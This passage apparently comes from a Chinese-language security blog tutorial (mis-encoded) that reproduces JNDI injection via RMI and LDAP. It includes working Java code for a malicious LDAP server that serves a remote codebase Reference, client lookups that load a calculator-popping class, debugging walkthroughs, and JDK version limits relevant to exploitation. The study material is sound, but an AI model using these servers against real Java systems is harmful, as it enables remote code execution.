class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        <span class="hljs-comment">//å°† JndiCalc ç±»çš„ JndiCalc æ–¹æ³•ï¼Œæ”¾åˆ° http://localhost:7777/</span><br>        <span class="hljs-comment">// åˆ›å»ºä¸€ä¸ª Reference å¯¹è±¡ï¼ˆæŒ‡å‘ä¸€ä¸ªå¯é€šè¿‡å·¥å‚/è¿œç¨‹ä½ç½®è·å–çš„ç±»ï¼‰</span><br>        <span class="hljs-type">Reference</span> <span class="hljs-variable">reference</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(<span class="hljs-string">&quot;JndiCalc&quot;</span>, <span class="hljs-string">&quot;JndiCalc&quot;</span>, <span class="hljs-string">&quot;http://localhost:7777/&quot;</span>);<br>        <span class="hljs-comment">// å°† Reference ç»‘å®šåˆ° JNDI å‘½åç©ºé—´ä¸­çš„ rmi URL ä¸‹</span><br>        initialContext.rebind(<span class="hljs-string">&quot;rmi://localhost:1099/remoteObj&quot;</span>, reference);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242107319.png"></p><p>ç„¶åç”¨å®¢æˆ·ç«¯è®¿é—®ï¼Œ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.naming.InitialContext;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JNDIRMIClient</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">InitialContext</span> <span class="hljs-variable">initialContext</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br>        <span class="hljs-type">IRemoteObj</span> <span class="hljs-variable">remoteObj</span> <span class="hljs-operator">=</span> (IRemoteObj) initialContext.lookup(<span class="hljs-string">&quot;rmi://localhost:1099/remoteObj&quot;</span>);<br>        System.out.println(remoteObj.sayHello(<span class="hljs-string">&quot;hello&quot;</span>));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¼¹å‡ºè®¡ç®—å™¨ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242108358.png"></p><p>è¿™ä¸ªè°ƒç”¨è¿‡ç¨‹å°±æ˜¯ 3.1 ä¸­ä»¥åŠåˆ†æè¿‡çš„ï¼Œå®é™…ä¸Šè¿˜æ˜¯è°ƒç”¨äº† lookup æ–¹æ³•</p><h3 id="è°ƒè¯•ï¼š"><a href="#è°ƒè¯•ï¼š" class="headerlink" title="è°ƒè¯•ï¼š"></a>è°ƒè¯•ï¼š</h3><p>åœ¨å®¢æˆ·ç«¯çš„ lookup å¤„æ–­ç‚¹</p><p>è·Ÿåˆ° RegistryImpl_Stub è¿™é‡Œï¼Œ</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242108548.png"></p><p>ç»§ç»­è·Ÿè¿›</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242108935.png"></p><p>è¿™é‡Œçœ‹åˆ° var2 è¢«èµ‹å€¼äº† ï¼Œè¿™é‡Œçš„ var2 æ˜¯ä¸€ä¸ªå¯¹è±¡å˜é‡ï¼ŒRef å°†å€¼ä¼ é€’ç»™äº†å®ƒ</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242108230.png"></p><p>æ­¥å…¥ decodeObject ï¼Œ</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242108027.png"></p><p><font style="color:rgb(80, 80, 92);">å…ˆåšäº†ä¸€ä¸ªç®€å•çš„åˆ¤æ–­ï¼Œåˆ¤æ–­æ˜¯å¦ä¸º </font><code>ReferenceWrapper</code>ï¼Œä¹Ÿå°±æ˜¯åˆ¤æ–­æ˜¯å¦ä¸º <code>Reference</code> å¯¹è±¡</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242109861.png"></p><p>ç»§ç»­è·Ÿè¿› getObjectInstance</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242109168.png"></p><p>è¿™é‡Œä½¿ç”¨å¼ºè½¬å°† refInfo è½¬ä¸º Reference </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242110137.png"></p><p><font style="color:rgb(80, 80, 92);">ç»§ç»­å¾€ä¸‹èµ°ï¼Œ</font><font style="color:rgb(83, 83, 96);">getObjectFactoryBuilder() è¿™é‡Œè·å–åˆ°äº†æ¶æ„ç±»</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242110090.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242110041.png"></p><p><font style="color:rgb(80, 80, 92);">ç»§ç»­å¾€ä¸‹èµ°ï¼Œè·å–åˆ° codebaseï¼Œå¹¶ä¸”è¿›è¡Œ helper.loadClass()</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242110781.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242110428.png"></p><p>æ¥åˆ° newInstance() åä¼šè°ƒç”¨ JndiCalc ç±»æ‰§è¡Œä»£ç </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242110895.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242110953.png"></p><h2 id="3-2-Jndi-LDAP"><a href="#3-2-Jndi-LDAP" class="headerlink" title="3.2 Jndi + LDAP"></a>3.2 Jndi + LDAP</h2><h3 id="LDAP-ç®€ä»‹"><a href="#LDAP-ç®€ä»‹" class="headerlink" title="LDAP ç®€ä»‹"></a>LDAP ç®€ä»‹</h3><p>Lightweight Directory Access Protocol ï¼ˆè½»é‡çº§ç›®å½•è®¿é—®åè®®ï¼‰æ˜¯ä¸€ç§å¼€æ”¾çš„ã€ä¸ä¾›åº”å•†æ— å…³çš„è¡Œä¸šæ ‡å‡†åº”ç”¨åè®®ï¼Œ ç”¨äºé€šè¿‡äº’è”ç½‘åè®®(IP) ç½‘ç»œè®¿é—®å’Œç»´æŠ¤åˆ†å¸ƒå¼ç›®å½•ä¿¡æ¯æœåŠ¡ã€‚ç›®å½•æœåŠ¡åœ¨å¼€å‘å†…è”ç½‘å’Œäº’è”ç½‘åº”ç”¨ç¨‹åºä¸­å‘æŒ¥ç€é‡è¦ä½œç”¨ï¼Œå› ä¸ºå®ƒå…è®¸åœ¨æ•´ä¸ªç½‘ç»œä¸­å…±äº«æœ‰å…³ç”¨æˆ·ã€ç³»ç»Ÿã€ç½‘ç»œã€æœåŠ¡å’Œåº”ç”¨ç¨‹åºçš„ä¿¡æ¯ã€‚ä¾‹å¦‚ï¼Œç›®å½•æœåŠ¡å¯ä»¥æä¾›ä»»ä½•æœ‰ç»„ç»‡çš„è®°å½•é›†ï¼Œé€šå¸¸å…·æœ‰å±‚æ¬¡ç»“æ„ï¼Œä¾‹å¦‚å…¬å¸ç”µå­é‚®ä»¶ç›®å½•ã€‚åŒæ ·ï¼Œç”µè¯ç°¿æ˜¯åŒ…å«åœ°å€å’Œç”µè¯å·ç çš„ç”¨æˆ·åˆ—è¡¨ã€‚</p><h3 id="LDAP-èº«ä»½éªŒè¯çš„åŸºæœ¬æµç¨‹ï¼š"><a href="#LDAP-èº«ä»½éªŒè¯çš„åŸºæœ¬æµç¨‹ï¼š" class="headerlink" title="LDAP èº«ä»½éªŒè¯çš„åŸºæœ¬æµç¨‹ï¼š"></a><font style="color:rgb(25, 27, 31);">LDAP èº«ä»½éªŒè¯çš„åŸºæœ¬æµç¨‹ï¼š</font></h3><ol><li><strong><font style="color:rgb(25, 27, 31);">ç”¨æˆ·æä¾›å‡­è¯</font></strong><font style="color:rgb(25, 27, 31);">ï¼šç”¨æˆ·é€šè¿‡å®¢æˆ·ç«¯åº”ç”¨ï¼ˆå¦‚æ•°æ®åº“å®¢æˆ·ç«¯ï¼‰è¾“å…¥ç”¨æˆ·åå’Œå¯†ç ã€‚</font></li><li><strong><font style="color:rgb(25, 27, 31);">å®¢æˆ·ç«¯ä¸ LDAP æœåŠ¡å™¨é€šä¿¡</font></strong><font style="color:rgb(25, 27, 31);">ï¼šå®¢æˆ·ç«¯é€šè¿‡ LDAP åè®®ä¸ LDAP æœåŠ¡å™¨é€šä¿¡ï¼Œå°†ç”¨æˆ·åå’Œå¯†ç å‘é€ç»™ LDAP æœåŠ¡å™¨ã€‚</font></li><li><strong><font style="color:rgb(25, 27, 31);">LDAP æœåŠ¡å™¨éªŒè¯</font></strong><font style="color:rgb(25, 27, 31);">ï¼šLDAP æœåŠ¡å™¨æ£€æŸ¥ç”¨æˆ·åæ˜¯å¦å­˜åœ¨ï¼Œå¹¶å¯¹å¯†ç è¿›è¡ŒéªŒè¯ã€‚</font></li><li><strong><font style="color:rgb(25, 27, 31);">è¿”å›éªŒè¯ç»“æœ</font></strong><font style="color:rgb(25, 27, 31);">ï¼šå¦‚æœç”¨æˆ·åå’Œå¯†ç åŒ¹é…ï¼ŒLDAP æœåŠ¡å™¨è¿”å›è®¤è¯æˆåŠŸçš„ä¿¡æ¯ï¼Œå…è®¸ç”¨æˆ·è®¿é—®èµ„æºã€‚å¦åˆ™ï¼Œè¿”å›è®¤è¯å¤±è´¥ã€‚</font></li></ol><p><font style="color:rgb(25, 27, 31);">LDAP æ”¯æŒå¤šç§è®¤è¯æ–¹å¼ï¼Œå¦‚ï¼š</font></p><ul><li><strong>åŒ¿åè®¤è¯</strong><font style="color:rgb(25, 27, 31);">ï¼šä¸éœ€è¦æä¾›å‡­è¯ï¼Œä½†è®¿é—®æƒé™æœ‰é™ã€‚</font></li><li><strong>ç®€å•è®¤è¯</strong><font style="color:rgb(25, 27, 31);">ï¼šç”¨æˆ·æä¾›ç”¨æˆ·åå’Œå¯†ç è¿›è¡Œèº«ä»½éªŒè¯ã€‚</font></li><li><strong>SASL</strong>ï¼ˆç®€å•è®¤è¯å’Œå®‰å…¨å±‚ï¼‰è®¤è¯ï¼šç”¨äºæ›´å¤æ‚çš„è®¤è¯æœºåˆ¶ï¼Œæä¾›æ›´é«˜çš„å®‰å…¨æ€§ã€‚</li></ul><h3 id="LDAP-ç›®å½•æœåŠ¡çš„å¸¸ç”¨ç»“æ„"><a href="#LDAP-ç›®å½•æœåŠ¡çš„å¸¸ç”¨ç»“æ„" class="headerlink" title="LDAP ç›®å½•æœåŠ¡çš„å¸¸ç”¨ç»“æ„"></a><font style="color:rgb(25, 27, 31);">LDAP ç›®å½•æœåŠ¡çš„å¸¸ç”¨ç»“æ„</font></h3><p><font style="color:rgb(25, 27, 31);">LDAP ç›®å½•ä¸­çš„ä¿¡æ¯ç»„ç»‡ä¸ºæ ‘å½¢ç»“æ„ï¼Œç§°ä¸º </font><strong><font style="color:rgb(25, 27, 31);">ç›®å½•ä¿¡æ¯æ ‘ï¼ˆDITï¼‰</font></strong><font style="color:rgb(25, 27, 31);">ã€‚å¸¸è§çš„æ¡ç›®åŒ…æ‹¬ç”¨æˆ·ã€ç»„ç»‡ã€</font>éƒ¨é—¨ç­‰ã€‚æ¡ç›®ä½¿ç”¨ Distinguished Name (DN) è¿›è¡Œæ ‡<font style="color:rgb(25, 27, 31);">è¯†ï¼ŒDN åŒ…æ‹¬æ‰€æœ‰èŠ‚ç‚¹çš„å®Œæ•´è·¯å¾„ã€‚ä¾‹å¦‚ï¼Œä¸€ä¸ªç”¨æˆ·æ¡ç›®çš„ DN å¯èƒ½æ˜¯ï¼š</font></p><p><code>uid=john,ou=users,dc=example,dc=com</code></p><p><font style="color:rgb(25, 27, 31);">å…¶ä¸­ï¼š</font></p><ul><li><code>uid=john</code><font style="color:rgb(25, 27, 31);"> </font><font style="color:rgb(25, 27, 31);">è¡¨ç¤ºç”¨æˆ·åä¸º johnã€‚</font></li><li><code>ou=users</code><font style="color:rgb(25, 27, 31);"> </font><font style="color:rgb(25, 27, 31);">è¡¨ç¤ºè¯¥æ¡ç›®å±äºâ€œusersâ€ç»„ç»‡å•å…ƒã€‚</font></li><li><code>dc=example,dc=com</code>è¡¨ç¤º LDAP æœåŠ¡å™¨çš„åŸŸåæ˜¯ <code>example.com</code>ã€‚</li></ul><h3 id="æ¼æ´å¤ç°ï¼š"><a href="#æ¼æ´å¤ç°ï¼š" class="headerlink" title="æ¼æ´å¤ç°ï¼š"></a>æ¼æ´å¤ç°ï¼š</h3><p>å¯¼å…¥<code>unboundid-ldapsdk</code> çš„ä¾èµ–ã€‚</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.unboundid<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>unboundid-ldapsdk<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="Ldap-æœåŠ¡ç«¯ï¼š"><a href="#Ldap-æœåŠ¡ç«¯ï¼š" class="headerlink" title="Ldap æœåŠ¡ç«¯ï¼š"></a>Ldap æœåŠ¡ç«¯ï¼š</h4><h5 id="ä»£ç æ­å»º"><a href="#ä»£ç æ­å»º" class="headerlink" title="ä»£ç æ­å»º"></a>ä»£ç æ­å»º</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.Entry;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.LDAPException;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.ResultCode;<br><span class="hljs-keyword">import</span> javax.net.ServerSocketFactory;<br><span class="hljs-keyword">import</span> javax.net.SocketFactory;<br><span class="hljs-keyword">import</span> javax.net.ssl.SSLSocketFactory;<br><span class="hljs-keyword">import</span> java.net.InetAddress;<br><span class="hljs-keyword">import</span> java.net.MalformedURLException;<br><span class="hljs-keyword">import</span> java.net.URL;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LdapServer</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">LDAP_BASE</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;dc=example,dc=com&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span> <span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//æ­¤å¤„çš„ url è¡¨ç¤ºè¿”å›ç»™å®¢æˆ·ç«¯çš„ codebaseURL (http://127.0.0.1:8000)</span><br>        <span class="hljs-comment">//æ ¼å¼ä¸ºï¼šhttp://127.0.0.1:port/#Refnameï¼›</span><br>        <span class="hljs-comment">//Refname å°±æ˜¯è¦åŠ è½½çš„ç±»ï¼Œport ä¸º http ç›‘å¬çš„ç«¯å£</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;http://127.0.0.1:8000/#JndiCalc&quot;</span>;<br>        <span class="hljs-comment">//ldap æœåŠ¡ç›‘å¬çš„ç«¯å£ï¼Œå®¢æˆ·ç«¯è¿æ¥è¿™ä¸ªç«¯å£æ‰§è¡Œ lookup</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">port</span> <span class="hljs-operator">=</span> <span class="hljs-number">1234</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//é…ç½® LDAP ç›‘å¬å™¨</span><br>            <span class="hljs-type">InMemoryDirectoryServerConfig</span> <span class="hljs-variable">config</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);<br>            config.setListenerConfigs(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryListenerConfig</span>(<br>                <span class="hljs-string">&quot;listen&quot;</span>,<br>                InetAddress.getByName(<span class="hljs-string">&quot;0.0.0.0&quot;</span>),<br>                port,<br>                ServerSocketFactory.getDefault(),<br>                SocketFactory.getDefault(),<br>                (SSLSocketFactory) SSLSocketFactory.getDefault()));<br><br>            <span class="hljs-comment">//æ³¨å†Œæ‹¦æˆªå™¨ï¼Œè¯¥æ‹¦æˆªå™¨åœ¨æ”¶åˆ° search æ“ä½œæ—¶ä¼šè¢«è°ƒç”¨ï¼Œå¯ä»¥è‡ªå®šä¹‰è¿”å›çš„ entry ï¼›æ­£æ˜¯å®ç°â€œè¿”å›æ¶æ„ LDAP å¼•ç”¨â€çš„åœ°æ–¹ã€‚</span><br>            config.addInMemoryOperationInterceptor(<span class="hljs-keyword">new</span> <span class="hljs-title class_">OperationInterceptor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(url)));<br>            <span class="hljs-type">InMemoryDirectoryServer</span> <span class="hljs-variable">ds</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryDirectoryServer</span>(config);<br>            System.out.println(<span class="hljs-string">&quot;Listening on 0.0.0.0:&quot;</span> + port);<br>            ds.startListening();<br>        &#125;<br>        <span class="hljs-keyword">catch</span> ( Exception e ) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OperationInterceptor</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">InMemoryOperationInterceptor</span> &#123;<br>        <span class="hljs-keyword">private</span> URL codebase;<br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * */</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_">OperationInterceptor</span> <span class="hljs-params">( URL cb )</span> &#123;<br>            <span class="hljs-built_in">this</span>.codebase = cb;<br>        &#125;<br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * &#123;<span class="hljs-doctag">@inheritDoc</span>&#125;</span><br><span class="hljs-comment">         * * <span class="hljs-doctag">@see</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)</span><br><span class="hljs-comment">         */</span> <span class="hljs-meta">@Override</span><br>        <span class="hljs-comment">//å½“ LDAP å®¢æˆ·ç«¯åš search/lookup æ—¶è§¦å‘</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processSearchResult</span> <span class="hljs-params">( InMemoryInterceptedSearchResult result )</span> &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">base</span> <span class="hljs-operator">=</span> result.getRequest().getBaseDN();<br>            <span class="hljs-type">Entry</span> <span class="hljs-variable">e</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Entry</span>(base);<br>            <span class="hljs-keyword">try</span> &#123;<br>                sendResult(result, base, e);<br>            &#125;<br>            <span class="hljs-keyword">catch</span> ( Exception e1 ) &#123;<br>                e1.printStackTrace();<br>            &#125;<br>        &#125;<br>        <span class="hljs-comment">///ç»„è£…è¿”å›çš„ LDAP æ¡ç›®</span><br>        <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sendResult</span> <span class="hljs-params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="hljs-keyword">throws</span> LDAPException, MalformedURLException &#123;<br>            <span class="hljs-type">URL</span> <span class="hljs-variable">turl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-built_in">this</span>.codebase, <span class="hljs-built_in">this</span>.codebase.getRef().replace(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>).concat(<span class="hljs-string">&quot;.class&quot;</span>));<br>            System.out.println(<span class="hljs-string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="hljs-string">&quot; redirecting to &quot;</span> + turl);<br>            e.addAttribute(<span class="hljs-string">&quot;javaClassName&quot;</span>, <span class="hljs-string">&quot;Exploit&quot;</span>);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">cbstring</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.codebase.toString();<br>            <span class="hljs-type">int</span> <span class="hljs-variable">refPos</span> <span class="hljs-operator">=</span> cbstring.indexOf(<span class="hljs-string">&#x27;#&#x27;</span>);<br>            <span class="hljs-keyword">if</span> ( refPos &gt; <span class="hljs-number">0</span> ) &#123;<br>                cbstring = cbstring.substring(<span class="hljs-number">0</span>, refPos);<br>            &#125;<br>            e.addAttribute(<span class="hljs-string">&quot;javaCodeBase&quot;</span>, cbstring);<br>            e.addAttribute(<span class="hljs-string">&quot;objectClass&quot;</span>, <span class="hljs-string">&quot;javaNamingReference&quot;</span>);<br>            e.addAttribute(<span class="hljs-string">&quot;javaFactory&quot;</span>, <span class="hljs-built_in">this</span>.codebase.getRef());<br>            result.sendSearchEntry(e);<br>            result.setResult(<span class="hljs-keyword">new</span> <span class="hljs-title class_">LDAPResult</span>(<span class="hljs-number">0</span>, ResultCode.SUCCESS));<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å®¢æˆ·ç«¯ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.naming.InitialContext;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JNDILdapClient</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">InitialContext</span> <span class="hljs-variable">initialContext</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br>        <span class="hljs-comment">//        IRemoteObj remoteObj = (IRemoteObj) initialContext.lookup(&quot;ldap://localhost:1099/remoteObj&quot;);</span><br>        <span class="hljs-type">IRemoteObj</span> <span class="hljs-variable">remoteObj</span> <span class="hljs-operator">=</span> (IRemoteObj) initialContext.lookup(<span class="hljs-string">&quot;ldap://127.0.0.1:1234/EvilObject&quot;</span>);<br><br>        System.out.println(remoteObj.sayHello(<span class="hljs-string">&quot;hello&quot;</span>));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç”¨ python å¼€ä¸€ä¸ªæœåŠ¡ç›‘å¬ 8000ç«¯å£</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242113052.png"></p><p>æ¥ä¸‹æ¥å¯åŠ¨æœåŠ¡ç«¯ï¼Œå¯åŠ¨å®¢æˆ·ç«¯ï¼Œå¼¹å‡ºè®¡ç®—å™¨</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242113525.png"></p><h5 id="ä½¿ç”¨-ApacheDirectoryStudio-æ­å»º-LDAP-æœåŠ¡"><a href="#ä½¿ç”¨-ApacheDirectoryStudio-æ­å»º-LDAP-æœåŠ¡" class="headerlink" title="ä½¿ç”¨ ApacheDirectoryStudio æ­å»º LDAP æœåŠ¡"></a>ä½¿ç”¨ ApacheDirectoryStudio æ­å»º LDAP æœåŠ¡</h5><p><strong>æ³¨æ„ï¼šç³»ç»Ÿçš„ java ç¯å¢ƒä½¿ç”¨ jdk 11ï¼Œjdk 8 çš„ç‰ˆæœ¬éƒ½è¿è¡Œä¸äº† LDAP ç¯å¢ƒï¼</strong></p><p>æ–°å»ºä¸€ä¸ª LDAP æœåŠ¡ï¼Œ</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509250821834.png"></p><p>è¿™æ ·å°±æ­å»ºæˆåŠŸäº†ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242113529.png"></p><blockquote><p>æ³¨æ„ä¸€ç‚¹å°±æ˜¯ï¼ŒLDAP+Referenceçš„æŠ€å·§è¿œç¨‹åŠ è½½Factoryç±»ä¸å—RMI+Referenceä¸­çš„ <code>com.sun.jndi.rmi.object.trustURLCodebase</code>ã€<code>com.sun.jndi.cosnaming.object.trustURLCodebase</code>ç­‰å±æ€§çš„é™åˆ¶ï¼Œæ‰€ä»¥é€‚ç”¨èŒƒå›´æ›´å¹¿ã€‚ä½†åœ¨JDK 8u191ã€7u201ã€6u211ä¹‹åï¼Œ<code>com.sun.jndi.ldap.object.trustURLCodebase</code>å±æ€§çš„é»˜è®¤å€¼è¢«è®¾ç½®ä¸º falseï¼Œå¯¹ LDAP Reference è¿œç¨‹å·¥å‚ç±»çš„åŠ è½½å¢åŠ äº†é™åˆ¶ã€‚</p><p>æ‰€ä»¥ï¼Œå½“JDKç‰ˆæœ¬ä»‹äº 8u191ã€7u201ã€6u211 ä¸ 6u141ã€7u131ã€8u121 ä¹‹é—´æ—¶ï¼Œæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨LDAP+Reference 